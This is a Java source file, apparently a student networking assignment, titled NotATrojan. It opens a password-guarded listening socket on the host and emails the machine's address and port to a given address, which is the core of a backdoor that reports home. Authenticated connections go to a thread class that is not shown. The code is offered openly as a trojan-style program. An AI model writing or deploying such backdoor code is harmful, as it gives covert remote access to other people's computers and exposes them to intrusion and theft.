
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 * NotATrojan.java
 * @author Andre Karlsson
 * Assignment 9.5.2 Internetprogrammering 1
 *
 */
public class NotATrojan {

    public NotATrojan(String port, String password, String email) throws IOException {
        this.port = port;
        this.password = password;
        this.email = email;

        createSocket();

    }

    public static void main(String[] args) throws IOException {

        NotATrojan trojan = new NotATrojan(args[0], args[1], args[2]);

    }
    private ServerSocket s;
    private String adress;
    private BufferedReader in;
    private PrintWriter out;
    private String port;
    private String password;
    private String email;

    private void sendMail() throws UnsupportedEncodingException {

        // Get system properties
        Properties props = System.getProperties();

        // Set server
        props.put("mail.smtp.host", "smtp.bredband.net");

        // Get session
        Session session = Session.getDefaultInstance(props, null);

        try {
            // Define message
            MimeMessage message = new MimeMessage(session);
            // From
            message.setFrom(new InternetAddress(email));
            // To
            message.addRecipient(Message.RecipientType.TO,
                    new InternetAddress(email));
            // Subject
            message.setSubject(adress + " " + port);
            // Message
            message.setText(adress + " " + port);

            // Send message
            Transport.send(message);


        } catch (MessagingException ex) {
            Logger.getLogger(NotATrojan.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * Method to initiate socket and server thread
     *
     */
    private void createSocket() throws IOException {


        s = new ServerSocket(Integer.parseInt(port)); // create new socket
        adress = s.getInetAddress().getHostAddress();

        System.out.println(adress);
        sendMail();
        while (true) {

            /* create socket */
            Socket c = null;

            /* accept connection*/
            c = s.accept();
            in = new BufferedReader(new InputStreamReader(c.getInputStream()));
            String msg;


            if ((msg = in.readLine()).equals(password)) {
                System.out.println("start");
                /* start server thread*/
                NotATrojanThread listen = new NotATrojanThread(c, password);
                listen.start();
            }else{
                c.close();
            }
        }



    }
}
